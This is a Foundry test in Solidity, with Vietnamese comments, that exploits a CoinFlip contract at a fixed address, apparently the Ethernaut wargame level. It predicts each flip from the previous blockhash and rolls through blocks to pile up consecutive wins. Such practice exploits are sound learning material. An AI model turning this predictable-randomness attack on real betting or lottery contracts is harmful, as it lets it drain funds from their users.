// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol"; // 1. Thêm dòng import này vào

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
    function consecutiveWins() external view returns (uint256);
}

contract CoinFlipTest is Test {
    ICoinFlip coinFlip;
    uint256 constant FACTOR = 5789604461865809771185492504343953926634992332820282019728792003956564819968;

    function setUp() public {
        coinFlip = ICoinFlip(0x174571d0A257FE8c7b378412478D7767411b91F6);
    }

    function testExploitCoinFlip() public {
        uint256 startBlock = block.number;

        for(uint256 i = 0; i < 10; i++) {
            vm.roll(startBlock + i); 

            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 coinFlipChoice = blockValue / FACTOR;
            bool guess = coinFlipChoice == 1 ? true : false;
            
            try coinFlip.flip(guess) returns (bool result) {
                // 2. Thay đổi emit log_bool thành console.log
                console.log("Luot thu", i, "- Doan dung?", result);
            } catch {
                startBlock++;
                i--;
            }
        }

        // 3. Thay đổi emit log_uint thành console.log
        console.log("Tong so tran thang tren hop dong that:", coinFlip.consecutiveWins());
    }
}